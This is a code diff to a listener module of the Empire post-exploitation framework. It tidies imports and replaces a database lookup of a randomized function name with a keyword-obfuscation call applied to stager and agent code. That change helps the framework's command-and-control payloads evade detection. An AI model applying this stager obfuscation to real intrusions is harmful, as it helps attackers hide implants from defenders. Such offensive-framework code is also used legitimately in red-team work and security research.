@@ -1,28 +1,27 @@
 from __future__ import print_function
-from builtins import str
-from builtins import object
-import logging
+
 import base64
-import random
-import os
-import ssl
-import time
 import copy
 import json
+import logging
+import os
+import random
+import ssl
 import sys
 import threading
-from pydispatch import dispatcher
-from flask import Flask, request, make_response, send_from_directory
+import time
+from builtins import object
+from builtins import str
 
+from flask import Flask, request, make_response, send_from_directory
+from pydispatch import dispatcher
+
+from lib.common import bypasses
+from lib.common import encryption
 # Empire imports
 from lib.common import helpers
-from lib.common import agents
-from lib.common import encryption
 from lib.common import packets
-from lib.common import messages
-from lib.common import templating
-from lib.common import obfuscation
-from lib.common import bypasses
+
 
 class Listener(object):
 
@@ -397,14 +396,11 @@ class Listener(object):
             f.close()
 
             # Get the random function name generated at install and patch the stager with the proper function name
+            # Get the random function name generated at install and patch the stager with the proper function name
             conn = self.get_db_connection()
             self.lock.acquire()
-            cur = conn.cursor()
-            cur.execute("SELECT Invoke_Empire FROM functions")
-            replacement = cur.fetchone()
-            cur.close()
+            stager = helpers.keyword_obfuscation(stager)
             self.lock.release()
-            stager = stager.replace("Invoke-Empire", replacement[0])
 
             # make sure the server ends with "/"
             if not host.endswith("/"):
@@ -488,16 +484,11 @@ class Listener(object):
             code = f.read()
             f.close()
 
-
+            # Get the random function name generated at install and patch the stager with the proper function name
             conn = self.get_db_connection()
             self.lock.acquire()
-            cur = conn.cursor()
-            cur.execute("SELECT Invoke_Empire FROM functions")
-            replacement = cur.fetchone()
-            cur.close()
+            code = helpers.keyword_obfuscation(code)
             self.lock.release()
-
-            code = code.replace("Invoke-Empire", replacement[0])
 
             # patch in the comms methods
             commsCode = self.generate_comms(listenerOptions=listenerOptions, language=language)
